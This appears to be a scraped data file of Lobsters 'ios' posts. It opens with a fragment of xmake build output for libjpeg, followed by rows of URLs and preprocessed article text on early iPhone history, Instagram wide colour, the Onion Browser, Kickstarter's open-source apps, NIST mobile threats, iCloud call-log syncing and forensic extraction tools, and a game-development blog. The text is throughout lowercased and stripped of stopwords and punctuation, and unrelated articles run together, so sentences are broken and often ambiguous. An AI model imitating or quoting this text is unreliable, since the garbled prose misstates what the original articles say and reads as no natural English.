jcparamc ccache compilingrelease jcphuffc ccache compilingrelease jcprepctc ccache compilingrelease jcsamplec ccache compilingrelease jctransc ccache compilingrelease jdapiminc ccache compilingrelease jdapistdc ccache compilingrelease jdatadstc ccache compilingrelease jdatasrcc ccache compilingrelease jdcoefctc ccache compilingrelease jdcolorc ccache compilingrelease jddctmgrc ccache compilingrelease jdhuffc ccache compilingrelease jdinputc ccache compilingrelease jdmainctc ccache compilingrelease jdmarkerc ccache compilingrelease jdmasterc ccache compilingrelease jdmergec ccache compilingrelease jdphuffc ccache compilingrelease jdpostctc ccache compilingrelease jdsamplec ccache compilingrelease jdtransc ccache compilingrelease jerrorc ccache compilingrelease jfdctfltc ccache compilingrelease jfdctfstc ccache compilingrelease jfdctintc ccache compilingrelease jidctfltc ccache compilingrelease jidctfstc ccache compilingrelease jidctintc ccache compilingrelease jidctredc ccache compilingrelease jmemansic ccache compilingrelease jmemmgrc ccache compilingrelease jmemnamec ccache compilingrelease jmemnobsc ccache compilingrelease ccache compilingrelease ccache compilingrelease jutilsc ccache compilingrelease rdbmpc ccache compilingrelease rdcolmapc ccache compilingrelease rdgifc ccache compilingrelease rdppmc ccache compilingrelease rdrlec ccache compilingrelease rdswitchc ccache compilingrelease rdtargac ccache compilingrelease transuppc ccache compilingrelease wrbmpc ccache compilingrelease wrgifc ccache compilingrelease wrppmc ccache compilingrelease wrrlec ccache compilingrelease wrtargac archivingrelease ccache compilingrelease wrjpgcomc linkingrelease wrjpgcom ccache compilingrelease linkingrelease ccache compilingrelease jpegtranc linkingrelease jpegtran ccache compilingrelease djpegc linkingrelease djpeg ccache compilingrelease ckconfigc linkingrelease ckconfig ccache compilingrelease rdjpgcomc linkingrelease rdjpgcom ccache compilingrelease cjpegc linkingrelease cjpeg build ok addition static library also compiled executable program target binary target cjpeg binary cjpegc target ckconfig binary ckconfigc target djpeg binary djpegc target jpegtran binary jpegtranc target rdjpgcom binary rdjpgcomc target wrjpgcom binary wrjpgcomc manual configuration need add compiling source code requires special compiler option example xmake f cxflags ldflags includedirs linkdirs xmake
318,Lobsters,ios,Apple iOS,Early iOS prototypes,https://www.youtube.com/watch?v=0eJZH-nkKP8,early io prototype,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature battle io interface iphone v youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature battle io interface iphone v youtube
319,Lobsters,ios,Apple iOS,'Sweating bullets' - The inside story of the first iPhone,http://www.bbc.com/news/technology-38552241,sweating bullet inside story first iphone,future phone left company last year malmo mystery keyboard killed looking back bbc rory cellanjones launch blog post secret stylus strategy steve ballmer laughter famously laughed device daveleebbc facebook,image copyright getty image image caption steve job unveiling first iphone steve expressly told totally top secret said going fire anyone tell world sweating bullet tony fadell pondering going explain steve job lost prototype would become successful technology product time apple iphone launched year ago mondayhe got plane felt pocket nothing walking every scenario thinking could happen told none ended wellafter two hour relief thanks effort search party know trying find fell pocket lodged seat image copyright getty image image caption tony fadell known godfather ipod within month world would know little device fadell holding future phonetony fadell sometimes referred godfather ipod left apple went found nest smart home company owned alphabet google parent company left company last year far fadell concerned today fact year anniversary first iphone started working idea born acceptance ipod turning around apple fortune platform could developed furtherby point ipod got video capability even game like wait second data network coming told bbc looking general purpose platform starting way magic ingredient meant iphone broke boundary fadell said competitor like microsoft trying shrink pc phone apple looking grow ipod something sophisticatedindeed one early iphone concept design used ipod distinctive clickwheel input method soon ditched medium playback unsupported device medium captiona look back launch first iphone january turning rotary phone sixty fadell remembered like work hard use happened another part apple work started touchscreen macintosh computer working secret size ping pong table steve showed said want take put ipod fadell warned job make touchscreen device like one envisioned would take time money new dedicated infrastructure went needed thousand people working time land together launch six month ship obviously pulled easy malmo mysteryapple many best brain business point ever made phone ownand fadell planned factfinding world tour meet expert check research lab telecom expert image copyright afp image caption first iphone drew crowd journalist launched began one manufacturer malmo sweden trip ended bag note equipment stolen car inside restaurant dinner knew building phone fadell said asked host get dinner minute tired got back car every single thing car gone every single bag swear corporate espionage secret lost team returned home without many belonging head full idea image copyright getty image image caption iphones continue popular though annual sale fell first time product history last year meanwhile one fiery debate getting startedkeyboard killed offit course iphone keyboard fight raged around four month fadell said ugly situation job heart set touchscreen became incensed people disagreeing idea enforced blunt policylooking back bbc rory cellanjones launcha sunday newspaper columnist described clutched phone fragment true cross viewer complained bbc given undue prominence product launch appeared newswatch programme defend reporting said product merit coverage promised step change way lived mused whether model ford would story tv news bulletin back afterwards rather regretted saying knew whether iphone would really prove revolutionary arrival mass car ownership today comparison look outlandish read rory blog post agree u come back room fadell recalled job saying prokeyboarders want team team disagreement soon stopped one person got sent room everybody got message fell line argument left room leave iphone team mind indeed people still think wrong decision go blackberrystyle keyboard back least phone beat laid risk using touchscreen work around one image copyright getty image image caption fan gawp new device went sale six month first unveiling secret stylus strategyfrom word go job clear iphone need work stylus finger needbut fadell told team working multitouch screen arguably greatest breakthrough iphone heralded make sure compatible stylus anyway thought must make work stylus fadell remembered knew right even though steve making philosophical point initially saying use finger knew come day going need stylus without knowledge behind scene would ripped head image copyright afp image caption latest iphone launched september thing secret common strategy stubborn engineer designer took view job know could nt hurt eventually proven right could accept praise thing happened ipod working pc fadell said steve wanted nothing ipod growth stalled said oh way working background asked steve much song itunes cost said cent said cost ipod plus song plus mac market share steve understood job may relented apple product work window took hatred stylus grave though successor tim cook introduced apple pencil ballmer laughterand january fan medium shuffled san francisco moscone center see job brought one thing end keynote address year macworld eventthe device stage halfbaked fadell recalled quickly referred jesus phone image copyright afp image caption success iphone likely helped popularise smartphones general press mocked cultish manner iphone unveiled steve ballmer time microsoft chief executive famously laughed device calling good email machine would nt appeal business user laughed fadell remembered also laughed blackberry whenever create new product learned steve job incumbent laugh press laugh go hit nerve since day billion iphones sold helping make apple richest company world follow dave lee twitter daveleebbc facebook bbc interview tony fadell granted condition limited history iphone work company
320,Lobsters,ios,Apple iOS,Bringing Wide Color to Instagram,https://engineering.instagram.com/bringing-wide-color-to-instagram-5a5481802d7d,bringing wide color instagram,bringing wide color instagram wide color matter craig hockenberry new book canary sample one capture core graphic operation colorspace creation filter pipeline image export image storage cdn pillow handy tutorial bringing together opening,bringing wide color instagramlast september apple announced iphone plus include camera capture greater range color previous model screen display wider color range finished updating instagram support wide color since one first major apps wanted share process converting app help others conversion role cto often deepdives particular technical area wide color main area november december wide color mattersfor year photo captured shared srgb color space srgb great compatibility display became standard image shared web recently mobilefor year srgb good job representing color displayed monitor display camera technology improves starting limited color represented srgbtake example photo room instagram hq captured iphone plus orange color room outside srgb color gamut detail lost unless use wider color space color space apple chose device going forward display highlighted blue portion image outside srgb present display word part image information getting lost next walk needed change step instagram image pipeline bring wide color support feed story direct started project none u ig deep expert color good starting point recommend craig hockenberry new book early draft helpful started converting instagrama canarythe useful tool working wide color compatibility canary image show wide color sample oneif look like red square likely monitor display srgb color open widecolor display device see instagram logo magically appear otherwise information lostyou use canary identify exactly process app losing wide color information step turn back red squarecapturethis easy part apple apis output widecolor image available compatible camera one tweak made looking converting new avcapturedevicediscoverysession let u take full advantage new dual lens system pluscore graphic operationsafter capture image import camera roll often apply simple operation like crop resizes done core graphic change make widecolor compatibilityif ever done image manipulation core graphic following pattern familiar uigraphicsbeginimagecontextwithoptions drawing operation hereuiimage image uigraphicsgetimagefromcurrentimagecontext uigraphicsendimagecontext legacy api widecolor aware instead use new uigraphicsimagerenderer uigraphicsimagerendererformat format uigraphicsimagerendererformat alloc init formatprefersextendedrange yes uigraphicsimagerenderer renderer uigraphicsimagerenderer alloc initwithsize size format format uiimage image renderer imagewithactions uigraphicsimagerenderercontext renderercontext drawing operation simplify transition ig create wrapper class around uigraphicsimagerenderer take block image drawing action accepts cgcontext implemented category uiimage engineer use uiimage renderedimagewithsize cgsize action imageactionsblock action whereas imageactionsblock single argument cgcontextref use old uigraphicsbeginimage approach calling block context ready us new renderer calling block insideimagewithactionscolorspace creationin place like initializing cgcontext drawing operation common use cgcolorspacecreatedevicergb creating cgcolorspaceref create srgb colorspace device lose wide color information initial work wide color instagram tracking everywhere color space hardcodedinstead see screen support wide color using uiscreenmainscreentraitcollectiondisplaygamut use cgcolorspacecreatewithname found creating wrapper return appropriate colorspace device helpfulwhen downloading image sure color space use instead use cgimagegetcolorspace serve display image io app create widecolor graphic context neededfilter pipelineinstagram us opengl image editing filtering opengl color managed operates range say output surface determine color actually map tothe good news meant make change make gl pipeline widecolor compatible biggest change ensure extracted pixel buffer gl surface using appropriate colorspace converting cvpixelbufferref cgimagerefwe trouble getting eaglview builtin way displaying gl content uiview color spaceaware solution render offscreen buffer grab wide color image buffer place back screen using uiimageview widecolor compatible default work highframerate application like game sufficient need developing highframerate application wide color solved please reach add information postimage exportat point captured wide color image resized coregraphics put opengl preserving wide color last step taking uiimage turning jpeg one simplest transition replace legacy uiimagejpegrepresentation uigraphicsimagerenderer jpegdata methodit point load exported image xcode debugger integration opening uiimages preview handy photoshop check resulting image color profile color informationimage storage cdnonce image received backend final resizing python using pillow serve image globally facebook cdnour challenge app user currently using device widecolor compatible many good color management built converting image multiple color profile fly would added complexity either cdn mobile appsto keep thing simple opted store widecolor nonwide version backend use python imagecmslibrary conversion two storage time handy tutorial library work tandem pillow accepts image object converting iccprofiles string representing file path diskconvertedimage imagecmsprofiletoprofile image srgbiccprofile read time apps specify whether display wide color gamut useragent backend dynamically serf image right profile future image captured wide color display color managed likely revisit doublewriting approachbringing togetherit still early day wide color documentation still sparse wanted share nitty gritty converted instagram process converting app hit question please drop note comment interested joining instagram io team take look opening
321,Lobsters,ios,Apple iOS,The official Tor browser for iOS is free to use,http://arstechnica.com/security/2017/01/tor-onion-browser-ios-vpn/,official tor browser io free use,onion browser tor propublica u presidential election blog post tor browser orfox uiwebview wkwebview blog post quite secure firefox exploit endless,techno fishy mike tigas first created onion browser app io never expected become popular working newsroom web developer spokesmanreview spokane washington time wanted tor browser app colleague expecting little interest put onion browser apple app store lowest nonzero price apple allows fast forward tigas found living new york city working developer investigative journalist propublica earning upwards month worrying charging keeping anonymous browsing hand people needed week ago made app free since popularity exploded thousand downloads recorded every day result recent u presidential election might something decision impressive result tigas told ar given recent event many believe important ever exercise support freedom speech privacy right digital security wrote blog post think good time ever make onion browser accessible everyone global concern also influenced decision iran technically country get iphone grey market told ar people ca nt get apps pay credit card apple actually accepts added noting economic sanction forbid apple selling iranian io user onion browser leading communitysupported tor web browser io lack feature available tor browser linux macos window orfox android due technical roadblock peculiar io tor project far declined officially endorse app io onion browser io order gain control browser network setting route web traffic tor tigas use older webkit api uiwebview instead newer version wkwebview newer version us device system setting network proxy setting modified app onion browser setting two biggest challenge tor developer io face tigas outlined blog post tor project website apple requirement browser use io webkit rendering engine inability run tor systemwide service daemon io developer found workarounds problem io user soon expect see new improved onion browser well tor vpn route device traffic first quarter quite secure unlike tor orfox onion browser based firefox gecko rendering engine browser vulnerable firefox also bad code reused challenge tigas said apple webkit apis allow lot control rendering execution web page making tor browserstyle security slider difficult implement many io multimedia feature nt use browser network stack making difficult ensure native video player leak traffic outside tor onion browser try provide functionality block javascript multimedia feature yet robust platform tigas wrote moreover nt support tabbed browsing ux pretty basic tigas working rewrite based endless add lot important feature existing onion browser said like nicer userinterface tabbed browsing http everywhere hsts preloading new version onion browser work based endless hopefully enter beta testing month
323,Lobsters,ios,Apple iOS,The iPod-based interface that lost out to iOS for the iPhone,http://sonnydickson.com/2017/01/06/the-ipod-based-interface-that-lost-out-to-ios-for-the-iphone/,ipodbased interface lost io iphone,cult mac,video always known apple considered variety idea deciding enter mobile phone market ex employee discussing behind closed door seen cult mac article much known alternate version iphone much like first production iphone prototype feature many feature including aluminium chassis multitouch compatible screen connectivity wifi radio however despite carrying similar design phone extremely different iphone know today instead modern touchdriven interface call io featured operating system dubbed acorn o internal code name unclear would kept name released derived acorn shown boot present onscreen click wheel took bottom portion screen half screen ui identical one found beloved ipod option dial sm music contact recent however lacking browser option interface interacted way ipod would operated much else known device apart fact differs heavily iphone know today unit running acorn o exist likely destroyed apple company specific job role relation destruction prototype many could attempt doubt authenticity device clear proof existence found one apple patent international application filed ipod iphone drawing referenced patent show multi touch device feature click wheel fig one could hope unit end hand museum one day smartphones today going forward would likely look different device apple clearly made right choice choosing base iphone strictly touch turning portable connected device full web access arguably one biggest boldest feature nevertheless fascinating see many idea considered leading iphone know today
324,Lobsters,ios,Apple iOS,Open sourcing our Android and iOS apps! - Kickstarter,https://kickstarter.engineering/open-sourcing-our-android-and-ios-apps-6891be909fcd,open sourcing android io apps kickstarter,open sourcing android io apps android io open source functional swift conference public benefit corporation charter prior art open sourcing eigen fun thing explore screenshots use view model test iterative development styling updating design updating design functionality journey open source android app rxjava functional core imperative shell functional swift conference brooklyn swift meetup functional swift conference brandon chris christella courtney gina lisa stephen next hiring,open sourcing android io apps today kickstarter engineering team open sourcing android io apps excited future working opennative squad enjoying postlaunch winter sunshinewhy open source native team kickstarter responsible building maintaining feature android io focus writing welltested code built part easily understood adopted many functional programming technique ton benefit predicted start excited share finding developer communitywe started organizing functional swift conference hosted first two conference kickstarter office moved budapest wanted give space swift developer new old functional programming come together share ideasbuilding conference wanted take sharing step idea open sourcing apps came around time kickstarter became public benefit corporation putting commitment public good core company charter started thinking could embrace principle engineer believe open sourcing give new level transparency engineering culture also provide useful resource global developer communityprior artit would impossible organization open source io application without mentioning monumental contribution artsy made area inspired artsy open sourcing eigen openbydefault policy general provided community great service thankful initiative takensome fun thing explorehere quick glance thing particularly proud screenshots directory hold nearly screenshots various screen every language device edgecase state example backer viewing project french creator looking dashboard german ipad herewe use view model lightweight way isolate side effect embrace functional core write pure mapping input signal output signal test heavily including test localization accessibility event trackingwe use swift playground iterative development styling major screen app get corresponding playground see wide variety device language data real time browse collection playground hereour first two pull request open source repository updating design backer activity feed updating design functionality user profilethe journey open sourcebrandonthe native engineering team kickstarter coming hectic period development yearandahalf ago two io engineer brandon gina worked fouryearold objectivec codebase majority written brandon early day kickstarter even android appchrisone winter day chris backend engineer expressed interest building android app moved work fulltime along way hired lisa former summer intern help android brandon gina also jumped made great contribution projectin le eight month four engineer never written production java code let alone production android code shipped grueling rewarding experience final product wellreceived stable great way backer explore projectslisaone tool employed start java code functional programming regardless difficult write truly functional code java knew embraced immutable data structure pure function best ability would able avoid lot complexity creep application naturally led using rxjava wrangling ui interaction declarative fashion came simplified way separating pure logic sideeffects code much spirit functional core imperative shellstephenthe result highly testable code base could fully understood isolation concern interacted rest system quite proud code dust settled releasing kickstarter android left sinking feeling still fouryearold objectivec codebase poke back aliveginaluckily team quite familiar swift community headed brandon coorganizing functional swift conference gina cohosts brooklyn swift meetup extensive knowledge could leverage swift type system better express problem wanted model also android experience knowledge build application ground way allowed u piece together functional part sideeffects boundarieschristellathus embarked yet another formidable journey rewriting io app swift creating something entire team could share ownership amplified thing learned work android many time unwavering eye writing much pure functional code possible writing way enhanced testability seeing new thing would unlock u every turn excited development gave two separate talk year functional swift conference cool thing katieas native engineering team often look back functional programming important tool empowered u work way team mixed skill background experience level became team could write understandable welltested code android io platform found common philosophical basis development functional programming importantly tried overidentify engineer specific platform rather look software development holistic disciplinemaggiethere open source software would possible without effort entire native squad brandon chris christella courtney katie gina lisa maggie stephencourtneywhat next excited working open able share cool thing come freely challenge face honestly quite thing look forward including writing first kotlin code android exploring new way writing declarative view course big swift migrationif sound interesting hiring sincerely kickstarter native team
325,Lobsters,ios,Apple iOS,A Computer for Everything: One Year of iPad Pro,https://www.macstories.net/stories/one-year-of-ipad-pro/,computer everything one year ipad pro,year found side use ipad pro successful business advocating last ipad story february club macstories ebook version club macstories member downloads area signing club macstories today,year spent adapting learned mac bring io found side focused efficient way working communicating people ipad pro accelerated move iosonly setup today genuinely know perform certain task mac anymore use ipad pro everything writing machine favorite research tool also rely organize finance play game read book watch movie program python workflow manage two successful business advocating multipurpose use ipad platform ipad pro elevated threshold possibility reaching inflection point pushed others switch ipad primary computer well much ipad strength lie io app ecosystem apple stop making ipads still prefer work device run io rather macos io app innovation happens regular basis developer oneupping term software achieve also prefer structure interaction io ipad pro purest representation io computer transform anything need even discussion settled long time ago bear repeating million people today like working io macos ipad pro best machine run io sarcastic subtext mac still fantastic environment many apple user love need line work mac ipad coexist market customer believe one superior prefer working ipad others like mac fine ultimately apple ecosystem whole grows stronger reap benefit past year daily ipad pro usage made personal goal optimize ipad workflow much possible one best aspect io platform competition developer fierce always choose different apps get work done apps improved regular basis constantly updated latest io technology enough curiosity patience io reward discovery new way work save time since last ipad story february taken hard look entire ipad setup rethought part working tried new apps created new automation optimized every weak spot could find improved collaborate teammate produce weekly content club macstories member thanks time invested understanding finetuning ipad pro able embark project double macstories growth manage larger team result ipad pro today noticeably capable year ago without need hardware refresh done ebook version ebook version story available exclusively club macstories member club macstories offer access weekly macstories extra including workflow app recommendation interview start ebook downloaded member downloads area download file io read get exclusive extra support macstories signing club macstories today tableofcontents
328,Lobsters,ios,Apple iOS,Jean-Louis Gass√©e on the evolution of macOS and iOS,http://www.loopinsight.com/2016/12/05/jean-louis-gassee-on-the-evolution-of-macos-and-ios/,jeanlouis gass√©e evolution macos io,,jeanlouis gass√©e monday note mac software engine included appletalk network stack laserwriter driver ran single motorola cpu needed rom ramand today macos fullygrown computer operating system pleasant fast flexible also enormous ram disk storage requirement measured gigabyte exactly bugfree exapple acquaintance recently told something like open bug ongoing basis number urgent course fraction gamut like mature operating system macos become battlefield patch upon patch upon patchand apple smartphone project started key decision choice software engine apple try make lite version o x known go completely new direction note jeanlouis founder ceo inc appears new direction may tempting time apple smartphone project began apple employee former engineer offered palm inc beos code dump code support royalty engineer highly respected skill mating software unfamiliar hardware beos small light operating system draw palm purchased year turned learned asked become chairman palmsource palm software spinoff wow heard bit beforei could go excerpt really read piece terrific writing someone lived intersection apple history
329,Lobsters,ios,Apple iOS,What is mobile security? What is the mobile security ecosystem?,http://developers.redhat.com/blog/2016/11/21/what-is-mobile-security-what-is-the-mobile-security-ecosystem/,mobile security mobile security ecosystem,mobile security mobile security ecosystem,mobile security mobile security ecosystem recently introduced published draft national institute standard technology nist u department commerce talk assessing threat mobile device infrastructure document discus mobile threat catalogue describes identifies structure threat posed mobile information system blog summarizes document added context commentary based experience mobile industry helping organization building mobile apps ever today connected world security protection information highest priority recent distributed denial service ddos attack brought internet generated unauthorized use internet thing iot device proving yet security breach crippling use mobile device continues grow globally organization mobile apps access mission critical information important broader view entire mobile security ecosystem understand everything involves mobile security say information powerful weapon case protect mobile solution nist document outline catalog threat mobile device associated mobile infrastructure support development implementation mobile security solution better protect enterprise information technology smartphones tablet running modern mobile operating system primary target analysis iot device mobile device contain integrated hardware component support variety io mechanism communication mechanism wireless ie cellular wifi bluetooth gps nfc also include physical connector ie power synchronization cable sd card sim card etc wireless wired device communication mechanism expose mobile device distinct set threat must secured overall security device app may compromised secure since mobile device store lot data personal enterprise data becomes target sensitive information like home address telephone number medical information credit card number authentication information user password protecting data also mean protecting identity identity theft used gain unauthorized access information compromised stolen mobile security ecosystem mobile security ecosystem relates general threat category need reviewed understood threat mobile apps classified group software vulnerability exploit data residing within mobile app running mobile operating system malicious privacyinvasive apps identify malware based threat damage device andor mobile service different type authentication mechanism mobile apps authentication access device remote service remote network enterprise system vulnerability mobile apps represent high risk compromising sensitive personal enterprise data summary mobile app security data protection mobile app checklist securing mobile application building mobile apps architecture design app becomes critical first step security decision need made best practice need followed checklist consideration architecture design data transfer encryption dataatrest encryption store device andor store cloud data input validation use token key hashing salting password authentication corporate identity management integration security policy enterprise mobility management system emm need vpn connectivity backend integration legacy web service restful apis etc use data need transfer everything secure storage cloud onpremise file permission log file auditing information plan penetration test government regulatory compliance choice mobile application development platform feature information mobile app development security best practice major player space enterprise mobility management emm system common way managing employee mobile device enterprise include combination mobile device management mdm mobile application management mam functionality mdm focus securing monitoring mobile device mam focus app distribution controlling user access apps key feature emm system deliver mobile policy allowing whitelisted set application run remote data wipe ensuring lock screen disabling certain device peripheral eg camera different vendor offer different set policy important compare review difference implemented via sdks developer use building apps wrapper mechanism built mobile app binary source vulnerability mobile ecosystem mobile operating system vulnerability found mobile operating system level typically addressed platform vendor form patch new release android io window example vulnerability android gingerbread longer supported google considered one mobile operating system version malware attack device driver plugins provide access device hardware peripheral device functionality ordinarily unavailable webbased apps ie camera geolocation device motion accelerometer vibration battery status apache cordova plugins example mobile apps using device functionality potential security risk especially developer create plugins identify vulnerability cordova like mobile operating system cordova similar product report address security issue example critical issue identify apache cordova android release sd card sd card removable memory used expand storage capacity mobile device store data photo video music application data similar medium device laptopdesktop world sd card source malware spyware sim card removable hardware chip housing international mobile subscriber identity imsi needed obtain access cellular network preshared cryptographic key phone number even contact information every mobile device sim card making widely used security token world still hacker send properly signed binary sm text message downloads java applet onto sim access phone number identity information use modern sim card latest cryptography sm firewall selection binary sm trust recommended secure sim card mobile carrier infrastructure interoperability relates mobile operator includes threat base station network backhaul cellular network core signaling threat associated widely used signaling system network mobile network generation mobile network move proprietary network protocol ipbased network brought lot change many positive operation side time brought new security risk never seen mobile operator much either mobile app developer organization network infrastructure level tackle vulnerability important aware risk infrastructure interoperability level many detail lot thing learn regard mobile app security understanding ecosystem security threat good first step take building secured mobile solution http related
330,Lobsters,ios,Apple iOS,Jasonette - Native App over HTTP,http://jasonette.com/,jasonette native app http,free open source portable extensible,free everything free use small print say pay want publish app open source jasonette licensed mit license take code build publish apps whatever want portable magical backend server need learn use pay install use jasonette need json web server already jasonette server extensible jasonette essentially engine map json expression native component action nt force drop everything adopt technology exclusively extend even integrate existing native code seamlessly
331,Lobsters,ios,Apple iOS,"iPhones Secretly Send Call History To Apple, Security Firm Says",https://theintercept.com/2016/11/17/iphones-secretly-send-call-history-to-apple-security-firm-says/,iphones secretly send call history apple security firm say,apple emerged regularly us get seized phone obtain authentication token account steal nude photo icloud account used elcomsoft software imessage log authorized unauthorized icloud collection report financial time nine month ago white paper handling legal request law enforcement early clue frustrated apple customer complained expressed frustration knowing stop syncing harvesting call log associated android device correction nov,apple emerged guardian user privacy year fighting fbi demand help crack san bernardino shooter syed rizwan farook iphone company gone great length secure customer data recent year implementing better encryption phone refusing undermine encryption private information still escape apple product circumstance latest involves company online syncing service icloud russian digital forensics firm elcomsoft found apple mobile device automatically send user call history company server icloud enabled data get uploaded many instance without user choice notification need icloud enabled data sent said vladimir katalov ceo elcomsoft log surreptitiously uploaded apple contain list call made received io device complete phone number date time duration also include missed bypassed call elcomsoft said apple retains data user icloud account four month providing boon law enforcement may able obtain data either user phone encrypted unbreakable passcode carrier although large carrier u retain call log year may case carrier outside u regular call log get sent apple server facetime used make audio video call io device also syncs call history icloud automatically according elcomsoft company belief syncing regular call facetime call log go back least io apple released march beginning apple latest operating system io incoming missed call made thirdparty voip application like skype whatsapp viber use apple callkit make call also get logged cloud katalov said apple posse key unlock icloud account u law enforcement agency obtain direct access log court order still need tool extract parse elcomsoft said releasing update phone breaker software tool today used extract call history icloud account using account holder credential elcomsoft forensic tool used law enforcement corporate security department even consumer company also lease extraction code cellebrite israeli firm fbi regularly us get seized phone icloud data case elcomsoft tool help customer access icloud even without account credential obtain authentication token account account holder computer allowing get icloud data without apple help use authentication token also bypass twofactor authentication account holder set prevent hacker getting account elcomsoft note website apple collection call log potentially put sensitive information disposal people law enforcement elcomsoft customer anyone else might able obtain user icloud credential like hacker could potentially get celebrity fell victim phishing attack allowed hacker obtain icloud credential steal nude photo icloud account perpetrator reportedly used elcomsoft software harvest celebrity photo account unlocked generally someone attempt download data icloud account system would email notification account owner katalov said notification occurs someone downloads synced call log icloud apple acknowledged call log synced said intentional offer call history syncing convenience customer return call device apple spokesperson said email device data encrypted user passcode access icloud data including backup requires user apple id password apple recommends customer select strong password use twofactor authentication syncing icloud call log would first time apple found collecting data secretly month ago intercept reported similar activity occurring imessage log chris soghoian chief technologist american civil liberty union said surprised apple collecting information arguably even worst thing icloud told intercept fact icloud back would otherwise endtoend encrypted imessages far worse mind way government obtain call log without backup imessages may way get message still said proof icloud really achilles heel privacy iphone platform two biggest privacy problem associated icloud check box user opt require opt either jonathan zdziarski io forensics expert security researcher said think apple anything nefarious syncing call log said apple need clear user data collected stored cloud authorized unauthorized icloud collection icloud apple cloud service allows user sync data across multiple apple device including iphones ipads ipod mac iphone menu corresponding service give user option syncing mail contact calendar reminder browser history note wallet data even though call log automatically getting synced well menu list among item user choose sync way opt sync call log also way opt turning icloud completely cause issue like preventing apps storing document data whatsapp backup cloud disable uploadingsyncing note contact calendar web history call always katalov said one way call log disappear cloud user deletes particular call record log device also get deleted icloud account next automatic synchronization katalov said still researching issue appears case call log sync almost instantly icloud time happens hour addition syncing data among device user also configure icloud account automatically back store data katalov said call log get sent cloud backup well separate trafficking company discovered even user disable backup call log still get synced apple server would suggest apple add simple option disable call log syncing calendar thing katalov told intercept though acknowledges would likely take rearchitecting apple part nonetheless say allow people disable want even apple increased security mobile device recent year company moving data cloud le protected although icloud data encrypted apple server apple retains encryption key almost every instance therefore unlock account access data purpose law enforcement icloud data encrypted key controlled apple average user going understand zdziarski said well aware apple read icloud data want report financial time nine month ago indicated apple plan rearchitect icloud resolve issue better protect customer data yet occur apple discus privacy implication icloud collection website say implementing backup send icloud nearly data setting stored device white paper site discloses clearly call log get uploaded apple server icloud backup enabled neither document mention log still get uploaded even backup enabled even online document handling legal request law enforcement apple never mention call log available icloud say posse subscriber information customer provide including name physical address email address telephone number also say retains ip connection log day email metadata day content user chooses upload photo email document contact calendar bookmark law enforcement document also say apple server io device backup may include photo video user camera roll device setting application data imessages sm mm message voicemail time mention call log say icloud store call history associated facetime say maintains facetime call invitation log indicate subscriber sent invitation someone participate facetime call apple say log indicate communication user actually took place also say retains log day elcomsoft said true katalov said facetime log contain full information call including identification party call call duration said researcher also found facetime call log retained long four month early clue frustrated apple customer user aware call log synced apple server byproduct automatic syncing mean apple id someone different device example spouse different phone use apple id see call one device getting synced automatically device person using id irritating one user complained forum issue wife iphones apple id get call phone ring miss call phone show missed call icon phone app go phone app pretty clearly someone calling phone way fix stop another user expressed frustration knowing stop syncing use phone business noticed last day call make receive appearing wife iphone recent call history hunted high low setting phone joy indication however customer realized full implication log synced data sent stored apple server month apple company syncing call log cloud android phone well window mobile device also sync call log default window device use microsoft account katalov said many android smartphone version test company research indicates call log syncing occurs android newer version apple device way user disable call history syncing disable syncing completely pure stock version android one installed nexus pixel device way select category sync katalov said reason able thirdparty android version running sony htc samsung etc company already produce tool harvesting call log associated android device little subscriber prevent law enforcement obtaining icloud call log protect hacker might obtain apple id use twofactor authentication zdziarski said another solution takeaway really ever use icloud use control encryption key said correction nov earlier version story quoted director university computer forensics program also former fbi supervisory agent stating telecom provider generally retain call log day updated clarify u provider retain information year
332,Lobsters,ios,Apple iOS,The Monkey and the Apple,https://steve-yegge.blogspot.com/2016/11/the-monkey-and-apple.html,monkey apple,http ghosttrackcom monkey make game apple v android reddit thread apple good bad ugly going forward letter wrote back http ghosttrackcom,took couple year blogging felt nt much left way interesting thing say programming studying learning bit cloud development taught io development year google cocoon poked head learned people thing real world open source technology lo long last five year tinkering finally something kind interesting share wrote game well precise took old game wrote perhaps mentioned twice turned mobile game cloud backend waaaay work expected starting moreorless working game tweaking work cloud mobile mean come hard really turn yeah yep hard stupidly hard especially since brand loyalty chose google cloud platform year ago pretty raw let face io apis evolved ton timeframe well even recently working pretty immature technology stack come leap bound since sort stuff share definitely enough series blog post also le time happening noncopious spare time late night weekend running mmorpg fearsome task right incidentally opened game beta testing want try read along visit http ghosttrackcom request invite edit beta closed need iphone ipad ipod running io edit later love android pc one start guess logical thing would start beginning screw starting monkey monkey following conversation wife day went something like wifey baby lost stuff lot conversation started way since april give take started playing game stuff baby wifey wailing stuff house dropped boom disappeared right front eye watching five second later gone happened nt want tell nt sure saw happened ok baby come look wifey see right lot good stuff gone looking around believe baby looking around think think monkey wifey monkey monkey took stuff checking yep picked carrying sure enough pet monkey picked precious loot valuable stared disbelief unexpected betrayal worrying going get stuff back two problem first monkey nt killable via combat since marked pet creature personal home nonattackable nt know best decision ever seemed reasonable time second chance pulled big gun killed instance invoking kill method directly runtime inventory loot would replaced default monkey inventory banana fur whatever given pretty sure state accidentally replacing wife hardearned treasure banana bit fur legal ground divorce bit pickle wifey going get back ca nt believe monkey make drop well could ai immediately pick everything wifey worked hard stuff ca nt even remember amulet sword girdle kind stuff nt worry baby tap monkey see carrying everything give second figure picture show predicament wifey naga warrior old guy blue pajama like real life monkey barely visible square japanese shoji screen every creature game event queue command processor respond generally set command player normally ai decides command give monster inject command right circumstance even take control eg charm monster spell decided try command monkey give item one time game written mostly java good portion maybe written jython implementation python language java virtual machine usefully jython eval exec function interactive code evaluation opened command interpreter went work exec monster mapmonsterlist ok eval monster monkey exec monkey monstersiterator next ok eval monkey monkey eval monkeyinventory monsterinventory contains bit fur lb bone lb amulet acid resistance lb bag lb far good reference monkey interpreter seeing wifey stolen valuable plus expected monkey inventory coup de grace eval monkeycommandnow give amulet rhialto none monkey give amulet acid resistance woot success keep chasing monkey around since offhand could nt think way make stand still retrospect could paralyzed set ai stationary ai used immobile monster could nt bothered look right since nt ever situation quite like wife alternating indignation amused disbelief near panic stolen stuff mechanism getting item back followed monkey issued commandnow instruction unfortunately lasting surprise monkey started ignoring fourth fifth item continued business would give item still nt know exactly since edge case scenario large toolchest utility command manipulating player inventory map content rare need command monster give stuff normally get monster inventory oldfashioned way pay iron price irked monkey emergent nonchalance pulled hammer eval monkeykill ok killed monkey case attacker feared corpse inventory completely empty clear inventory pet monster prevent abuse create builder mode take stuff make infinite cash busted clone command manually recreated rest missing item best could gave back wifey pleased report story happy ending make game look game like wyvern heart tile game like old roguelikes maybe bit mud think gosh could top head need cloud computing platform aws azure gcp xcode mac else android studio 